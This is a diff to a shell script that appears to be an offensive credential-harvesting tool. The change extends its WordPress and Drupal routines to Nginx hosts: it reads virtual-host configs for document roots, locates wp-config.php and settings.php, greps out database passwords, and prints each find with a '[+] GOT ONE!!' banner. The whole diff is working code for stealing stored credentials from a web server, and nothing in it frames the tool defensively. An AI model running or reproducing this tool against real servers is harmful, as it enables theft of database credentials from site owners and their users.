@@ -237,6 +237,8 @@ _dump_wordpress() {
 	#Let try with anybody, and if we find a file, let's rock
 	#First, find WebRoot (apache? nginx? others?)
 	#Second, find wp-config.php and grep it!
+
+	# Verify Apache Web Server
 	if [ -d /etc/apache2/sites-available/ ]; then
 		for site in /etc/apache2/sites-available/*
 		do
@@ -262,11 +264,43 @@ _dump_wordpress() {
 		done
 	fi
 
+	# Verify Nginx web server
+	if [ -d /etc/nginx/sites-available/ ]; then
+		for site in /etc/nginx/sites-available/*
+		do
+			#This regex avoids comments
+			#Are we sure we have one and only one root in conf file?
+			DOCROOT=$(egrep -i 'root /' $site | grep -E -v "\w*#" | sed -e 's/^.*root//' | cut -d ' ' -f 2 | tr -d ';')
+			if [ -d $DOCROOT ]; then
+				OLDIFS=$IFS
+				IFS=$'\n'
+				WPCONF=$(find $DOCROOT -maxdepth 3 -name "wp-config.php*")
+			
+				if [ ${#WPCONF} -gt 1 ]; then
+					#Sometimes we have other credz in wp-config.php such as ftp?
+					for wpconf in $WPCONF
+					do
+						CREDZ=$(grep -B4 -A1 DB_PASSWORD $wpconf)
+						_dump_name "Wordpress config file"
+						_print_win "$wpconf" "$CREDZ"
+					done
+				else
+					[ $VERBOSE -eq 1 ] && _dump_name "Wordpress config file"
+					_print_lose "$DOCROOT" "No wordpress wp-config.php found"
+				fi
+				IFS=$OLDIFS
+			fi
+		done
+	fi
+
+
 }
 
 _dump_drupal() {
 	#And now drupal
 	#Maybe use same code with wordpress?
+
+	# Verify Apache web server
 	if [ -d /etc/apache2/sites-available/ ]; then
 		for site in /etc/apache2/sites-available/*
 		do
@@ -291,6 +325,36 @@ _dump_drupal() {
 				_print_lose "$DOCROOT" "No drupal settings.php found"
 			fi
 			IFS=$OLDIFS
+		done
+	fi
+
+	# Verify Nginx web server
+	if [ -d /etc/nginx/sites-available/ ]; then
+		for site in /etc/nginx/sites-available/*
+		do
+			#This regex avoids comments
+			#Are we sure we have one and only one root in conf file?
+			DOCROOT=$(egrep -i 'root /' $site | grep -E -v "\w*#" | sed -e 's/^.*root//' | cut -d ' ' -f 2 | tr -d ';')
+			if [ -d $DOCROOT ]; then
+				OLDIFS=$IFS
+				IFS=$'\n'
+				DRUPALCONF=$(find $DOCROOT/ -maxdepth 5 -name "settings.php*")
+				if [ ${#DRUPALCONF} -gt 1 ]; then
+					for drupalconf in $DRUPALCONF
+					do
+						#Sometimes we have other credz in settings.php?
+						CREDZ=$(grep -E -v "\w*\*" $drupalconf | grep -B4 -A1 "password' =>" )
+						if [ ${#CREDZ} -gt 1 ]; then
+							_dump_name "Drupal config file"
+							_print_win "$drupalconf" "$CREDZ"
+						fi
+					done
+				else
+					[ $VERBOSE -eq 1 ] && _dump_name "Drupal config file"
+					_print_lose "$DOCROOT" "No drupal settings.php found"
+				fi
+				IFS=$OLDIFS
+			fi
 		done
 	fi
 
@@ -401,7 +465,11 @@ _print_win() {
 	#$1 : file containing secret
 	#$2 : secret
 	echo ${GREEN}"[+] GOT ONE!!"${RESTORE}
-	echo ${LBLUE}"File: "${RESTORE} $(realpath "$1")
+	if [ -x /usr/bin/realpath ]; then
+		echo ${LBLUE}"File: "${RESTORE} $(realpath "$1")
+	else
+		echo ${LBLUE}"File: "${RESTORE} "$1"
+	fi
 	echo "$2"
 	#This is the place to save file for a future use
 }
